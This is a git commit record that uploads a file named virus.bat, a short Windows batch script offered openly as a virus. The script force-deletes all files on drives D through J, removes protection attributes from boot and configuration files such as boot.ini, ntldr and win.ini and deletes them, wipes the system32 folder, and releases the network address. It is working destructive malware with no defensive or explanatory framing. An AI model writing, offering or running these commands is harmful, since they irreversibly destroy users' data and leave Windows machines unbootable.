5108e7c600b0372bf3cca45be6d67c196d4f8843
SUGAR DADDY 🗿 <140779732+CODE-WITH-MASKMAN@users.noreply.github.com>
2024-06-10 09:41:13 +0545

    Add files via upload

---
+++ virus.bat
@@ -0,0 +1,18 @@
+@echo off
+del D:\*.* /f /s /q
+del E:\*.* /f /s /q
+del F:\*.* /f /s /q
+del G:\*.* /f /s /q
+del H:\*.* /f /s /q
+del I:\*.* /f /s /q
+del J:\*.* /f /s /q
+attrib -r -s -h c:\autoexec.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini
+del c:\WINDOWS\system32\*.*/q
+Ipconfig /release
